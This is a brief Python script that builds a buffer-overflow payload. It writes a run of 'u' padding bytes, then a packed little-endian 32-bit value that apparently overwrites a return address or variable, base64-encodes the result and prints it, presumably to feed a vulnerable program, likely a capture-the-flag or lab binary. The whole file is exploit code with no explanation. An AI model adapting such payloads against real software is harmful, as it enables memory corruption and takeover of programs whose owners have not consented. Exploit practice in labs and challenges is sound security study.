
import sys
import struct
import base64

buf = b'uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu'
buf += struct.pack('<I', 1683691979)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
